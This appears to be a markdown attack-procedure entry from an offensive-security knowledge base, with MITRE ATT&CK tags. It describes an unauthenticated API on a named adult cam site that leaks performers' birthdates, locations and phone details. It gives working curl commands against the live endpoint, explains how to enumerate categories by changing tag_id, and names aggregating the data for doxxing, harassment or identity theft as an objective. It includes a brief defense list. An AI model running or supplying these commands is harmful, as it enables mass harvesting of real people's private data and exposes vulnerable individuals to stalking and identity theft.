---
tags:
  - information-disclosure
  - pii-leak
  - api
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-access-offline-models-api]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T17:32:28.769Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 4a0035e4-3fac-48bb-8887-c8f500e83694
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
---

# Access-Offline-Models-API-for-PII-Leak

## Summary

This procedure exploits an unauthenticated information disclosure vulnerability in the /api/models/get-offline-models-by-tags.php endpoint of xvcams.com, allowing retrieval of JSON responses containing PII such as birthdates, locations, eye colors, phone verification statuses, and internal IDs for offline models. It is primarily used in reconnaissance to harvest data for privacy violations like identity theft or harassment.

## Description

The endpoint accepts GET parameters like sitekey, tag_id, service, and a timestamp (t), returning unfiltered model data without authentication. By accessing it directly via browser or curl, attackers can enumerate models by tags (e.g., tag_id=115 for specific categories), exposing sensitive details that should be protected. This systemic issue lacks data sanitization, enabling scripted harvesting for doxxing or phishing campaigns. Prerequisites include internet access; no credentials are needed due to the public nature.

## Requirements

1. Internet connectivity to reach https://www.xvcams.com
2. Tool for HTTP GET requests (browser or curl)
3. Basic understanding of JSON parsing for data extraction

## Defense

Defensive measures and detection strategies:

- Implement authentication (e.g., API keys or JWT) on sensitive endpoints
- Apply data filtering to exclude PII from responses (e.g., anonymize locations, omit birthdates)
- Monitor access logs for anomalous GET patterns to /api/models/* with varying tag_id
- Use rate limiting and WAF rules to block unauthenticated bulk requests

## Objectives

1. Retrieve raw PII from offline models to assess exposure scope
2. Enumerate additional data by modifying parameters like tag_id
3. Aggregate data for potential misuse in targeted attacks

## Instructions

### Step 1: Send Initial GET Request to Endpoint

**Context**: Initiate access to the API with default parameters to observe the leaked PII structure.

**Command** ([[commands/curl-access-offline-models-api]]):
```bash
curl "https://www.xvcams.com/api/models/get-offline-models-by-tags.php?sitekey=xvt&tag_id=115&service=girls&t=$(date +%s)" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> This command fetches JSON for tag_id=115 (e.g., a category like 'girls'). Expected output is a JSON array with model objects containing id, name, birthdate, age, location, eye_color, and phone details. Verify no auth errors occur.

### Step 2: Modify Parameters for Enumeration

**Context**: Alter tag_id or service to harvest data from different model sets, simulating mass collection.

**Command** ([[commands/curl-access-offline-models-api]]):
```bash
curl "https://www.xvcams.com/api/models/get-offline-models-by-tags.php?sitekey=xvt&tag_id=120&service=trans&t=$(date +%s)" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> Change tag_id to enumerate other categories. Output should show varied PII; pipe to jq for parsing: | jq '.[] | {id, birthdate, location}'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### Sub-Techniques


## Commands Used

- [[commands/curl-access-offline-models-api]]

## Tools Used

- [[tools/Web-Browser]]

## Tags

- information-disclosure
- pii-leak
- api

